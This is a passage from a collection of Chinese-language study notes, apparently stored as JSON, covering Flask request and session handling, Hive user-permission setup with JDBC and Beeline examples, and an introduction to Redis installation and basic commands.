window.URL.createObjectURL(blob);\n        downloadElement.href = href;\n        downloadElement.download = \"价格表.xls\"\n        document.body.appendChild(downloadElement);\n        downloadElement.click();\n        document.body.removeChild(downloadElement);\n        window.url.revokeObjectURL(href);\n        })\n}\n```\n后端：\n```py\n@app.route(\"/price_excel/import\", methods=['POST', 'GET'])\ndef import_excel():\n\tf = request.files.get(\"file\")\n\tprint(f.filename)\n\n\tfs = request.files.getlist(\"files\")\n\tfor f in fs:\n\t\tprint(f.filename)\n```\n\n# Sessions\n我们可以使用全局对象session来管理用户会话。Sesison 是建立在 Cookie 技术上的，不过在 Flask 中，我们还可以为 Session 指定密钥，这样存储在 Cookie 中的信息就会被加密，从而更加安全。直接看 Flask 官方的例子吧。\n```py\nfrom flask import Flask, session, redirect, url_for, escape, request\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    if 'username' in session:\n        return 'Logged in as %s' % escape(session['username'])\n    return 'You are not logged in'\n\n@app.route('/login', methods=['GET', 'POST'])\ndef login():\n    if request.method == 'POST':\n        session['username'] = request.form['username']\n        return redirect(url_for('index'))\n    return '''\n        <form method=\"post\">\n            <p><input type=text name=username>\n            <p><input type=submit value=Login>\n        </form>\n    '''\n\n@app.route('/logout')\ndef logout():\n    # remove the username from the session if it's there\n    session.pop('username', None)\n    return redirect(url_for('index'))\n\n# set the secret key.  keep this really secret:\napp.secret_key = 'A0Zr98j/3yX R~XHH!jmN]LWX/,?RT'\n```\n\n# 文件上传\n利用Flask也可以方便的获取表单中上传的文件，只需要利用 request 的files属性即可，这也是一个字典，包含了被上传的文件。如果想获取上传的文件名，可以使用filename属性，不过需要注意这个属性可以被客户端更改，所以并不可靠。更好的办法是利用werkzeug提供的secure_filename方法来获取安全的文件名。\n```py\nfrom flask import request\nfrom werkzeug.utils import secure_filename\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        f = request.files['the_file']\n        f.save('/var/www/uploads/' + secure_filename(f.filename))\n```\n\n# Cookies\nFlask也可以方便的处理Cookie。使用方法很简单，直接看官方的例子就行了。下面的例子是如何获取cookie。\n```py\nfrom flask import request\n\n@app.route('/')\ndef index():\n    username = request.cookies.get('username')\n    # 使用 cookies.get(key) 代替 cookies[key] 避免\n    # 得到 KeyError 如果cookie不存在\n```\n如果需要发送cookie给客户端，参考下面的例子。\n```py\nfrom flask import make_response\n\n@app.route('/')\ndef index():\n    resp = make_response(render_template(...))\n    resp.set_cookie('username', 'the username')\n    return resp\n```\n\n# 重定向和错误\nredirect和abort函数用于重定向和返回错误页面。\n```py\nfrom flask import abort, redirect, url_for\n\n@app.route('/')\ndef index():\n    return redirect(url_for('login'))\n\n@app.route('/login')\ndef login():\n    abort(401)\n    this_is_never_executed()\n```\n默认的错误页面是一个空页面，如果需要自定义错误页面，可以使用errorhandler装饰器。\n```py\nfrom flask import render_template\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    return render_template('page_not_found.html'), 404\n```\n\n# 响应处理\n默认情况下，Flask会根据函数的返回值自动决定如何处理响应：如果返回值是响应对象，则直接传递给客户端；如果返回值是字符串，那么就会将字符串转换为合适的响应对象。我们也可以自己决定如何设置响应对象，方法也很简单，使用make_response函数即可。\n```py\n@app.errorhandler(404)\ndef not_found(error):\n    resp = make_response(render_template('error.html'), 404)\n    resp.headers['X-Something'] = 'A value'\n    return resp\n```\n\n# 返回json数据\n```py\n@app.route('/')\ndef index():\n    return dict(name=\"luotuo\", fnas=10000)\n```"
  },
  {
    "title": "./notes/Data/hive.md",
    "body": "# hive的用户与权限\nHiverServer2支持远程多客户端的并发和认证，支持通过JDBC、Beeline等连接操作。hive默认的Derby数据库，由于是内嵌的文件数据库，只支持一个用户的操作访问，支持多用户需用mysql保存元数据。现在关心的是HiveServer如何基于mysql元数据库管理用户权限，其安全控制体系与Linux及Hadoop的用户是否存在联系。\n## remote方式部署Hive\nHive中metastore（元数据存储）的三种方式：内嵌Derby方式、基于mysql的Local方式、基于mysql的Remote方式。显然多用户并发模式是采用remote方式部署，Hiveserver元数据放置在mysql数据库并在mysql建立用户，HiveClient远程连接。回顾下remote方式部署Hive：\n第一步：元数据库mysql创建用户名和数据库；\n第二步：HiveServer在 hive-site.xml 文件中配置jdbc URL、驱动、用户名、密码等属性；\n```xml\n<property>\n  <name>javax.jdo.option.ConnectionURL</name>\n  <value>jdbc:mysql://mysql server IP/hive_meta?createDatabaseIfNotExist=true</value>\n  <description>JDBC connect string for aJDBC metastore</description>\n</property>\n\n<property>\n <name>javax.jdo.option.ConnectionDriverName</name>\n <value>com.mysql.jdbc.Driver</value>\n  <description>Driver class name for aJDBC metastore</description>\n</property>\n\n<property>\n <name>javax.jdo.option.ConnectionUserName</name>\n  <value>hive</value>\n  <description>username to use againstmetastore database</description>\n</property>\n\n<property>\n  <name>javax.jdo.option.ConnectionPassword</name>\n  <value>hive</value>\n  <description>password to use againstmetastore database</description>\n</property>\n\n<property>\n <name>hive.metastore.warehouse.dir</name>\n  <!-- base hdfs path -->\n <value>/user/hive/warehouse</value>\n  <description>base hdfs path :locationof default database for the warehouse</description>\n</property>\n```\n第三步：HiveClient在hive-site.xml 文件中配置thrift(负责client和server的通信)和存储路径；\n```xml\n<!--thrift://<host_name>:<port> 默认端口是9083 -->\n<property>\n  <name>hive.metastore.uris</name>\n  <value>thrift://Hiveserver IP:9083</value>\n  <description>Thrift uri for the remotemetastore. Used by metastore client to connect to remotemetastore.</description>\n</property>\n\n<!--  hive表的默认存储路径 -->\n<property>\n  <name>hive.metastore.warehouse.dir</name>\n  <value>/user/hive/warehouse</value>\n  <description>location of defaultdatabase for the warehouse</description>\n</property>\n\n<property>\n   <name>hive.metastore.local</name>\n   <value>false</value>\n</property>\n```\n第四步：HiveServer启动metastore监听\n执行命令：hive–service metastore -p port_num //默认端口是9083.\n第五步：HiveClient执行hive命令。\n上述5步，下图是很清晰的展现。\n这里写图片描述\n![](https://gitee.com/naiswang/images/raw/master/20190915093800.png =400x)\n\n## msyql元数据字典表\n从remote方式部署的Hive看，还未体现出多用户管理及其权限控制，需进一步深入研究下图四个模块的关系。\n这里写图片描述\n![](https://gitee.com/naiswang/images/raw/master/20190915093846.png =600x)\nHive早期版本是通过Linux的用户和用户组来控制用户权限，无法对Hive表的CREATE、SELECT、DROP等操作进行控制。现Hive基于元数据库来管理多用户并控制权限。数据分为元数据和数据文件两部分，元数据存储在mysql，而数据文件则是HDFS，控制元数据即控制可访问的数据文件。\n\nHive在mysql上的元数据表主要分为：Database相关、Table相关、数据存储相关SDS、COLUMN相关、SERDE相关(序列化)、Partition相关(分区)、SKEW相关(数据倾斜)、BUCKET相关(分桶)、PRIVS相关(权限管理)，对数据库-数据表、用户有相应关系体现。其中TBL_PRIVS存储了表/视图的授权信息，见如下数据字典：\n\n|  元数据表字段   |     说明      |        示例数据         |\n| -------------- | ------------- | ---------------------- |\n| TBL_GRANT_ID   | 授权ID        | 1                      |\n| CREATE_TIME    | 授权时间       | 1436320455             |\n| GRANT_OPTION   | ?             | 0                      |\n| GRANTOR        | 授权执行用户   | liuxiaowen             |\n| GRANTOR_TYPE   | 授权者类型     | USER                   |\n| PRINCIPAL_NAME | 被授权用户     | username               |\n| PRINCIPAL_TYPE | 被授权用户类型 | USER                   |\n| TBL_PRIV       | 权限          | Select、Alter           |\n| TBL_ID         | 表ID          | 22，对应TBLS表中的TBL_ID |\n\n再看mysql中存储Hive中所有数据库基本信息的表DBS数据字典：这里写图片描述\n![](https://gitee.com/naiswang/images/raw/master/20190915094213.png =500x)\n从mysql存储的Hive元数据表数据字典看，Hive是基于元数据mysql管理多用户权限，用户权限信息都存储在元数据表中。要重点理解是，mysql只是保存Hive的元数据，mysql本身的用户和Hive没有关系，Hive只是把自己的用户信息保存在mysql元数据表中。数据字典中关于权限元数据总结如下：\n> Db_privs:记录了User/Role在DB上的权限\n> Tbl_privs:记录了User/Role在table上的权限\n> Tbl_col_privs：记录了User/Role在table column上的权限\n> Roles：记录了所有创建的role\n> Role_map：记录了User与Role的对应关系\n\n## Hive用户权限管理\n从remote部署hive和mysql元数据表字典看，已经明确hive是通过存储在元数据中的信息来管理用户权限。现在重点是Hive怎么管理用户权限。首先要回答的是用户是怎么来的，发现hive有创建角色的命令，但没有创建用户的命令，显然Hive的用户不是在mysql中创建的。在回答这个问题之前，先初步了解下Hive的权限管理机制。\n\n第一：在hive-site.xml文件中配置参数开启权限认证\n```xml\n<property>\n    <name>hive.security.authorization.enabled</name>\n    <value>true</value>\n    <description>enableor disable the hive clientauthorization</description>\n</property>\n\n<property>\n    <name>hive.security.authorization.createtable.owner.grants</name>\n    <value>ALL</value>\n    <description>theprivileges automatically granted to the ownerwhenever a table gets created. Anexample like \"select,drop\" willgrant select and drop privilege to theowner of the table</description>\n</property>\n```\nhive.security.authorization.enabled参数是开启权限验证，默认为false。\nhive.security.authorization.createtable.owner.grants参数是指表的创建者对表拥有所有权限。\n\n第二：Hive的权限管理是通过用户(User)、组(Group)、角色(Role)来定义，角色定义了权限，赋予给组或用户，用户归属于组。\n角色相关命令：create role rolename、drop rolename、grant rolename to user username；\n\n第三：Hive权限控制：\n![](https://gitee.com/naiswang/images/raw/master/20190915094414.png =500x)\n例子：把select权限授权给username用户，命令如下：\n```shell\nhive>grant select on database databasename to user username;\n```\n第四：为限制任何用户都可以进行Grant/Revoke操作，提高安全控制，需事先Hive的超级管理员。\n在hive-site.xml中添加hive.semantic.analyzer.hook配置，并实现自己的权限控制类HiveAdmin。\n```xml\n<property>\n    <name>hive.semantic.analyzer.hook</name>\n    <value>com.hive.HiveAdmin</value>\n</property>\n```\ncom.hive.HiveAdmin类代码如下：\n```java\npackage com.hive;\nimportorg.apache.hadoop.hive.ql.parse.ASTNode;\nimportorg.apache.hadoop.hive.ql.parse.AbstractSemanticAnalyzerHook;\nimportorg.apache.hadoop.hive.ql.parse.HiveParser;\nimportorg.apache.hadoop.hive.ql.parse.HiveSemanticAnalyzerHookContext;\nimportorg.apache.hadoop.hive.ql.parse.SemanticException;\nimportorg.apache.hadoop.hive.ql.session.SessionState;\n\npublic class  HiveAdmin extends AbstractSemanticAnalyzerHook {\n    private static String admin = \"admin\";\n       @Override\n    public ASTNodepreAnalyze(HiveSemanticAnalyzerHookContextcontext,\n    ASTNodeast)throws SemanticException {\n        switch(ast.getToken().getType()) {\n        caseHiveParser.TOK_CREATEDATABASE:\n        caseHiveParser.TOK_DROPDATABASE:\n        caseHiveParser.TOK_CREATEROLE:\n        caseHiveParser.TOK_DROPROLE:\n        caseHiveParser.TOK_GRANT:\n        caseHiveParser.TOK_REVOKE:\n        caseHiveParser.TOK_GRANT_ROLE:\n        caseHiveParser.TOK_REVOKE_ROLE:\n                     StringuserName = null;\n        if(SessionState.get() != null\n        &&SessionState.get().getAuthenticator()!= null){\n        userName=SessionState.get().getAuthenticator().getUserName();\n                    }\n        if(!admin.equalsIgnoreCase(userName)) {\n        thrownewSemanticException(userName\n                                + \" can't use ADMIN options,except \" + admin +\".\");\n                    }\n        break;\n        default:\n        break;\n                }\n        returnast;\n        }\n}\n```\n这样只有admin用户这一超级管理员可以进行Grant/Revoke操作。\n\n到此基本理解了Hive的用户权限管理框架，但核心问题还是Hive的用户组和用户来自于哪里？既不是mysql中的用户，Hive本身也不提供创建用户组和用户的命令。折腾一番后，突然理解Hive用户组和用户即Linux用户组和用户，和hadoop一样，本身不提供用户组和用户管理，只做权限控制。\n到此可以梳理下Hive用户权限管理的简单流程：\n第一步：创建超级管理员；\n第二步：新建linux用户组和用户，也可以在既定用户组下建用户，赋予用户hive目录权限；\n第三步：超级管理员进入hive，授权新建用户组和用户的操作权限；\n第四步：客户端可以通过新建用户名和密码连接到hive执行授权内的动作；\n\n# Beeline工具\nHiveServer2提供了一个新的命令行工具Beeline，它是基于SQLLine CLI的JDBC客户端。Beeline工作模式有两种，即本地嵌入模式和远程模式。嵌入模式情况下，它返回一个嵌入式的Hive（类似于Hive CLI）；而远程模式则是通过Thrift协议与某个单独的HiveServer2进程进行连接通信。\n```shell\n%bin/beeline\nbeeline>!connect\njdbc:hive2://host:port/db;\nauth=noSaslhiveuser password org.apache.hive.jdbc.HiveDriver\n```\n命令中db就是在hiveserver中配置好的数据库并授权hiveuser使用。\n\n# JDBC操作Hive\n使用JDBC驱动程序操作Hive中的数据大体可以分成四个步骤，分别为：\n1.  加载HiveServer2驱动程序，Class.forName(\"org.apache.hive.jdbc.HiveDriver\")。\n2.  根据URL连接指定的数据库：Connection cnct =DriverManager.getConnection(\"jdbc:hive2://<host>:<port>\",\"<user>\", \"<password>\")。在非安全模式下，指定一个<user>运行查询，忽略密码<password>，在Kerberos 安全模式下，用户信息基于Kerberos 凭证。\n3.  通过Statement 对象将查询提交到数据库并执行：Statement stmt = cnct.createStatement(); ResultSet rset = stmt.executeQuery(\"SELECT foo FROMbar\"); \n4. 对返回的结果进行必要的处理。\n\n下面看看Hive与JDBC数据类型的对应关系，如下表所示。\n![](https://gitee.com/naiswang/images/raw/master/20190915095115.png =500x)\n\n下面通过一个简单的例子看看HiveServer2 JDBC客户端代码是如何编写的。\n```java\nimport java.sql.Connection;\nimportjava.sql.DriverManager;\nimport java.sql.ResultSet;\nimportjava.sql.PreparedStatement;\nimport java.sql.SQLException;\npublic class HiveServer2Client {\n      publicstatic voidmain(String[] args) throws ClassNotFoundException{\n             Class.forName(\"org.apache.hive.jdbc.HiveDriver\");\n             try{\n                    Connection con = DriverManager.getConnection(\"jdbc:hive2://hadoop:10000/logdb\",\"hadoop\",\"\");\n                    PreparedStatement sta = con.prepareStatement(\"select cast(date as date) from ccp group bycast(date as date)\");\n                    ResultSet result = sta.executeQuery();\n                    while(result.next()){\n                           System.out.println(result.getDate(1));\n                    }\n             } catch(SQLException e) {\n                    e.printStackTrace();\n             }\n      }\n}\n```\n编译运行上面的代码需要确保类路径中包含下面所列的jar包，否则会失败：\nhive-jdbc-0.13.0.jar、hadoop-core-1.2.1.jar\n在实际执行上面的代码时，连接URL中的user参数不可以随意指定，指定的用户必须在HDFS上有操作文件的权限，否则会出现下面所示的异常：\norg.apache.hadoop.security.AccessControlException: Permission denied: user=hive, access=WRITE,inode=\"hive-hadoop\":hadoop:supergroup:rwxr-xr-x\n\n执行流程分析：\n首先通过Connection来指定要连接的url与user,  此时就会使用这个用户来访问url中的数据库，即HDFS上的某一个目录，例如，数据库目录如下：\n![](https://gitee.com/naiswang/images/raw/master/20190915110849.png =600x)\n执行代码如下：\n```java\nConnection con = DriverManager.getConnection(\"jdbc:hive2://ubuntuServer134:10000/test2\", \"whz\", \"\");\nPreparedStatement sta = con.prepareStatement(\"select * from sutdnt02\");\nsta.execute();\n```\n这个连接是会报如下错误的：\n> org.apache.hive.service.cli.HiveSQLException: Error while compiling statement: FAILED: SemanticException Unable to determine if hdfs://192.168.44.133:9000/db_test.db/sutdnt02 is encrypted: org.apache.hadoop.security.AccessControlException: Permission denied: user=whz, access=EXECUTE, inode=\"/db_test.db\":root:supergroup:drwx------\n\n\n\n# 总结\n首先hive用户来自linux，和hadoop一样，并具有组、用户、角色的管理体系，其权限信息保存在元数据库中。\n当然hive安全认证还有很多需要进一步了解，以进一步管理hadoop集群平台。"
  },
  {
    "title": "./notes/Data/redis.md",
    "body": "# Nosql概述\n## 为什么用Nosql\n先聊一下数据库的发展史：\n1. 单机MySQL的年代！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132631.png)\n90年代，一个基本的网站访问量一般不会太大，单个数据库完全足够！\n那个时候，更多的去使用静态网页 Html ~ 服务器根本没有太大的压力！\n思考一下，这种情况下：整个网站的瓶颈是什么？\n- 数据量如果太大、一个机器放不下了！\n- 数据的索引 （B+ Tree），一个机器内存也放不下\n- 访问量（读写混合），一个服务器承受不了~\n只要你开始出现以上的三种情况之一，那么你就必须要晋级！\n\n2. 使用Memcached（缓存） + MySQL + 垂直拆分 （读写分离）时代\n由于网站在80%的情况下都是在读，每次都要去查询数据库的话就十分的麻烦！所以说我们希望减轻数据的压\n力，我们可以使用缓存来保证效率！\n发展过程： 优化数据结构和索引--> 文件缓存（IO）---> Memcached（当时最热门的技术！）\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132640.png)\n\n3. 使用分库分表 + 水平拆分 + MySQL集群的年代\n技术和业务在发展的同时，对人的要求也越来越高！早年间，由于mysql使用的是MyISAM，而MyISAM只支持表锁，使得高并发下很容易出现严重的锁问题，后来，mysql转用Innodb, Innodb支持行锁，使得高并发下不是很容易出现锁问题，后来，mysql又推出了集群功能，很好满足哪个年代的所有需求！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132649.png)\n\n4. 如今的时代: Nosql + RDBMS\n随着互联网web2.0网站的兴起，传统的关系数据库在处理web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，出现了很多难以克服的问题，而非关系型的数据库则由于其本身的特点得到了非常迅速的发展。NoSQL数据库的产生就是为了解决大规模数据集合多重数据种类带来的挑战，特别是大数据应用难题。\n\n## 什么是Nosql\noSQL最常见的解释是“non-relational”， “Not Only SQL”也被很多人接受。NoSQL仅仅是一个概念，泛指非关系型的数据库，区别于关系数据库，它们不保证关系数据的ACID特性\nNoSQL有如下优点：\n- 易扩展，NoSQL数据库种类繁多，但是一个共同的特点都是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。无形之间也在架构的层面上带来了可扩展的能力。\n- 大数据量，高性能，NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单\n- 灵活的数据模型: NoSQL无须事先为要存储的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是——个噩梦。这点在大数据量的Web 2.0时代尤其明显\n- 高可用: NoSQL在不太影响性能的情况，就可以方便地实现高可用的架构。比如Cassandra、HBase模型，通过复制模型也能实现高可用\n\n## Nosql的四大分类\n**1. 键值(Key-Value)存储数据库**\n这一类数据库主要会使用到一个哈希表，这个表中有一个特定的键和一个指针指向特定的数据。Key/value模型对于IT系统来说的优势在于简单、易部署。但是如果数据库管理员(DBA)只对部分值进行查询或更新的时候，Key/value就显得效率低下了。举例如：Tokyo Cabinet/Tyrant， Redis， Voldemort， Oracle BDB。\n\n**2. 列存储数据库**\n这部分数据库通常是用来应对分布式存储的海量数据。键仍然存在，但是它们的特点是指向了多个列。这些列是由列家族来安排的。如：Cassandra， HBase， Riak.\n\n**3. 文档型数据库**\n文档型数据库的灵感是来自于Lotus Notes办公软件的，而且它同第一种键值存储相类似。该类型的数据模型是版本化的文档，半结构化的文档以特定的格式存储，比如JSON。文档型数据库可以看作是键值数据库的升级版，允许之间嵌套键值，在处理网页等复杂数据时，文档型数据库比传统键值数据库的查询效率更高。如：CouchDB， MongoDb. 国内也有文档型数据库SequoiaDB，已经开源。\n\n**4. 图形(Graph)数据库**\n图形结构的数据库同其他行列以及刚性结构的SQL数据库不同，它是使用灵活的图形模型，并且能够扩展到多个服务器上。NoSQL数据库没有标准的查询语言(SQL)，因此进行数据库查询需要制定数据模型。许多NoSQL数据库都有REST式的数据接口或者查询API。如：Neo4J， InfoGrid， Infinite Graph。\n\n不同分类特点对比\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132659.png)\n\n# Redis入门\nRedis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API\n\n与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。\n\nRedis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布/订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。\n\n## Linux下安装\nRedis推荐都是在Linux服务器上搭建的\n1. 下载安装包！ redis-5.0.8.tar.gz \n2. 解压Redis的安装包！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132711.png)\n3. 进入解压后的文件，可以看到我们redis的配置文件\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132725.png)\n4. 基本的环境安装\n```shell\nyum install gcc-c++ \nmake\nmake install\n```\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132737.png)\n5. redis的默认安装路径 /usr/local/bin\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132747.png)\n6. 将redis配置文件。复制到我们当前目录下\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132758.png)\n7. redis默认不是后台启动的，修改配置文件！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132808.png)\n8. 启动Redis服务！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132819.png)\n9. 使用redis-cli 进行连接测试！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132833.png)\n10. 查看redis的进程是否开启！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132846.png)\n11. 如何关闭Redis服务呢？ shutdown\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132901.png)\n\n## 测试性能 redis-benchmark 是一个压力测试工具！\n官方自带的性能测试工具！\nredis-benchmark 命令参数！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132911.png)\n\n我们来简单测试下：\n```shell\n# 测试：100个并发连接 100000请求 \nredis-benchmark -h localhost -p 6379 -c 100 -n 100000\n```\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132932.png)\n如何查看这些分析呢？\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132943.png)\n\n## 基础的知识\nredis默认有16个数据库\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329132957.png)\n默认使用的是第0个\n\n```shell\n127.0.0.1:6379> select 3 # 切换数据库 \nOK\n\n127.0.0.1:6379[3]> DBSIZE # 查看DB大小！ \n(integer) 0\n\n127.0.0.1:6379[3]> keys * # 查看数据库所有的key \n1) \"name\"\n\n127.0.0.1:6379[3]> flushdb # 清除当前数据库\nOK\n\n127.0.0.1:6379[3]> keys * \n(empty list or set)\n```\n\n### 为什么redis是单线程的\n注意：redis 单线程指的是网络请求模块使用了一个线程，即一个线程处理所有网络请求，其他模块仍用了多个线程。\n因为CPU不是Redis的瓶颈。Redis的瓶颈最有可能是机器内存或者网络带宽，既然单线程容易实现，而且CPU不会成为瓶颈，那就顺理成章地采用单线程的方案了。关于redis的性能，官方网站也有，普通笔记本轻松处理每秒几十万的请求\n\n### Redis为什么这么快\n- 完全基于内存，绝大部分请求是纯粹的内存操作，非常快速。数据存在内存中，类似于HashMap，HashMap的优势就是查找和操作的时间复杂度都是O(1)；\n- 采用单线程，避免了不必要的上下文切换和竞争条件，也不存在多进程或者多线程导致的切换而消耗 CPU，不用去考虑各种锁的问题，不存在加锁释放锁操作，没有因为可能出现死锁而导致的性能消耗\n\n# redis五大数据类型\nRedis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件MQ。 它支持多种类型的数据结构，如 字符串（strings）， 散列（hashes）， 列表（lists）， 集合（sets）， 有序集合（sorted sets） 与范围查询， bitmaps， hyperloglogs 和 地理空间（geospatial） 索引半径查询。 Redis 内置了 复制（replication），LUA脚本（Lua scripting）， LRU驱动事件（LRU eviction），事务（transactions） 和不同级别的 磁盘持久化（persistence）， 并通过Redis哨兵（Sentinel）和自动 分区（Cluster）提供高可用性（high availability）。\n\n后面如果遇到不会的命令，可以在官网查看帮助文档！\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329133010.png)\n\n## Redis-Key\n**keys ***\n```shell\n127.0.0.1:6379> keys * # 查看所有的key \n1) \"age\" \n2) \"name\" \n```\n\n**exists与move**\n```shell\n127.0.0.1:6379> EXISTS name # 判断当前的key是否存在 \n(integer) 1 \n127.0.0.1:6379> EXISTS name1 \n(integer) 0 \n\n127.0.0.1:6379> move name 1 # 移除当前的key, 后面的1表示当前数据库\n(integer) 1 \n127.0.0.1:6379> keys * \n1) \"age\" \n```\n\n**expire与ttl**\n```shell\n127.0.0.1:6379> EXPIRE name 10 # 设置key的过期时间，单位是秒\n(integer) 1\n127.0.0.1:6379> ttl name # 查看当前key的剩余时间 \n(integer) 3 \n127.0.0.1:6379> ttl name \n(integer) 2 \n127.0.0.1:6379> ttl name \n(integer) -2 \n127.0.0.1:6379> EXISTS name\n(integer) 0 \n```\n**对象作为key**\n`set user:1 {name:zhangsan,age:3}`: 设置一个`user:1`对象,值为json字符\n```shell\n127.0.0.1:6379> mset user:1:name zhangsan user:1:age 2 \nOK\n127.0.0.1:6379> mget user:1:name user:1:age \n1) \"zhangsan\" \n2) \"2\"\n```\n\n## String类型\n**set、get与getset**\n```shell\n127.0.0.1:6379> set name kuangshen # 设置key为name的值为kuangsheng\nOK\n127.0.0.1:6379> get name #查看key为name的值\n\"kuangsheng\" \n\n127.0.0.1:6379> getset name whz # 如果不存在key为whz的项，则返回 nil \n(nil)\n127.0.0.1:6379> getset age 16 # 如果存在key为age的项，设置它的值为16\n\"16\"\n```\n\n**mset与mget**\n```shell\n127.0.0.1:6379> mset k1 v1 k2 v2 k3 v3 # 同时设置多个值 \nOK\n127.0.0.1:6379> keys * \n1) \"k1\" \n2) \"k2\" \n3) \"k3\" \n127.0.0.1:6379> mget k1 k2 k3 # 同时获取多个值 \n1) \"v1\" \n2) \"v2\" \n3) \"v3\"\n```\n\n**setex、setnx与msetnx**\nsetex (set with expire) :设置过期时间 \nsetnx (set if not exist)\nmsetnx : 批量setnx\n```shell\n127.0.0.1:6379> setex key3 30 \"hello\" # 设置key3 的值为 hello,30秒后过期\nOK\n\n127.0.0.1:6379> setnx mykey \"redis\" # 如果mykey 不存在，创建mykey \n(integer) 1\n127.0.0.1:6379> setnx mykey \"MongoDB\" # 如果mykey存在，创建失败！ \n(integer) 0\n\n127.0.0.1:6379> msetnx mykey v1 k4 v4 # msetnx 是一个原子性的操作，要么一起成功，要么一起 失败！\n(integer) 0\n```\n\n**append与strlen**\n```shell\n127.0.0.1:6379> get key1\n\"v1\"\n127.0.0.1:6379> APPEND key1 \"hello\" # 追加字符串，如果当前key不存在，就相当于set key \n(integer) 7\n127.0.0.1:6379> get key1\n\"v1hello\"\n127.0.0.1:6379> STRLEN key1 # 获取字符串的长度！\n(integer) 7\n```\n\n**getrange与setrange**\n```shell\n127.0.0.1:6379> get key1 \n\"hello,kuangshen\"\n127.0.0.1:6379> GETRANGE key1 0 3 # 截取字符串 [0,3] \n\"hell\"\n127.0.0.1:6379> GETRANGE key1 0 -1 # 获取全部的字符串 和 get key是一样的 \n\"hello,kuangshen\"\n\n127.0.0.1:6379> get key2 \n\"abcdefg\" \n127.0.0.1:6379> SETRANGE key2 1 xx # 替换指定位置开始的字符串！ \n(integer) 7 \n127.0.0.1:6379> get key2 \n\"axxdefg\"\n```\n\n**incr、decr、incrby、decrby**\n```shell\n127.0.0.1:6379> get views \n\"0\"\n127.0.0.1:6379> incr views # 自增1 \n(integer) 1\n127.0.0.1:6379> get views \n\"1\"\n127.0.0.1:6379> decr views # 自减1 \n(integer) 0 \n127.0.0.1:6379> decr views \n(integer) -1 \n127.0.0.1:6379> get views \n\"-1\"\n127.0.0.1:6379> INCRBY views 10 # 可以设置步长，指定增量！ \n(integer) 9\n127.0.0.1:6379> DECRBY views 5\n(integer) 4 \n```\n\n\n## List类型\n在redis里面，我们可以把list玩成栈、队列、阻塞队列！\n**所有的list命令都是用l或r开头的**\n\n**lpush、lrange、rpush、rrange、lpop、rpop、lindex、llen、linsert、lset、rpoplpush**\n```shell\n127.0.0.1:6379> LPUSH mylist one # 表示将one插入mylist列表的左边\n(integer) 1 \n127.0.0.1:6379> LPUSH mylist two \n(integer) 2 \n127.0.0.1:6379> LPUSH mylist three \n(integer) 3\n\n127.0.0.1:6379> LRANGE mylist 0 1 # 获取mylist列表的从左开始的0到1的元素\n1) \"three\" \n2) \"two\" \n\n127.0.0.1:6379> LRANGE mylist 0 -1 # 获取mylist列表的从左开始的所有元素\n1) \"three\" \n2) \"two\" \n3) \"one\"\n\n127.0.0.1:6379> Rpush mylist four # 将four插入mylist列表的右边\n(integer) 4\n127.0.0.1:6379> LRANGE mylist 0 -1 \n1) \"three\" \n2) \"two\" \n3) \"one\" \n4) \"four\"\n\n127.0.0.1:6379> Lpop mylist # 移除mylist左边的第一个元素\n\"three\"\n127.0.0.1:6379> Rpop mylist # 移除mylist右边的第一个元素\n\"four\"\n127.0.0.1:6379> LRANGE mylist 0 -1 \n1) \"two\" \n2) \"one\"\n\n127.0.0.1:6379> lindex mylist 1 # 通过下标获得list中的某一个值！,注：没有rindex\n\"one\"\n\n127.0.0.1:6379> Llen mylist # 返回列表的长度 \n(integer) 2 \n\n127.0.0.1:6379> linsert mylist before two other # 在mylist列表中的two元素前面插入other\n(integer) 3\n127.0.0.1:6379> LRANGE mylist 0 -1 \n1) \"other\" \n2) \"two\" \n3) \"one\"\n\n127.0.0.1:6379> lset mylist 1 whz # 更新下标为1的值为whz\nOK\n127.0.0.1:6379> lrange mylist 0 -1\n1) \"other\"\n2) \"whz\"\n3) \"one\"\n\n127.0.0.1:6379> rpoplpush mylist list2 # 将mylist列表中的右边第一个元素移到list2列表的左边\n\"one\"\n127.0.0.1:6379> lrange mylist 0 -1\n1) \"other\"\n2) \"whz\"\n127.0.0.1:6379> lrange list2 0 -1\n1) \"one\"\n```\n\n**lrem与trim**\nlrem 